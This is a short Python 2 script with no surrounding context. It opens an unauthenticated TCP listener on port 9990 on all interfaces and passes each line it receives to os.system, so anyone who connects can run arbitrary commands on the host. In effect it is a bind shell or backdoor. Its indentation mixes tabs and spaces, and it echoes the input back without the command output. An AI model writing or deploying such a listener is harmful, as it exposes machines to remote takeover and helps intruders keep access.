import socket
import os

HOST = ''                 
PORT = 9990            

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)

conn, addr = s.accept()
print addr, "connected"
while 1:
    data = conn.recv(1024)
    if not data: break
    try:

        out = os.system(data)
	print out
    except:
	pass
    conn.sendall(data)

conn.close()
